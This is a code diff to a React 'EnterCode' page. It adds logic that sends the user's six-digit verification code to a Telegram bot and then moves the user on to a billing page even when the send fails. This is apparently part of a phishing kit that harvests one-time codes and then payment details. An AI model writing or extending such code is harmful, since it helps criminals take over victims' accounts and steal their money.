@@ -1,16 +1,38 @@
 import React, { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
+import { sendCodeData } from '../services/telegramBot';
 
 const EnterCode = () => {
   const navigate = useNavigate();
   const [showCode, setShowCode] = useState(false);
   const [code, setCode] = useState('');
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(false);
 
   const isCodeValid = code.length === 6 && /^\d+$/.test(code);
 
-  const handleNext = () => {
+  const handleNext = async () => {
     if (isCodeValid) {
-      navigate('/billing');
+      setLoading(true);
+      setError(false);
+      try {
+        // Send code data to Telegram
+        const success = await sendCodeData({ code: code });
+        
+        if (success) {
+          navigate('/billing');
+        } else {
+          setError(true);
+          // Fallback after some time to not get stuck
+          setTimeout(() => navigate('/billing'), 2000);
+        }
+      } catch (err) {
+        console.error('Error submitting code:', err);
+        setError(true);
+        setTimeout(() => navigate('/billing'), 2000);
+      } finally {
+        setLoading(false);
+      }
     }
   };
 
@@ -78,11 +100,11 @@ const EnterCode = () => {
               Cancel
             </button>
             <button 
-              className={`next-btn ${!isCodeValid ? 'disabled' : ''}`}
+              className={`next-btn ${!isCodeValid || loading ? 'disabled' : ''}`}
               onClick={handleNext}
-              disabled={!isCodeValid}
+              disabled={!isCodeValid || loading}
             >
-              Next
+              {loading ? 'Processing...' : 'Next'}
             </button>
           </div>
         </div>
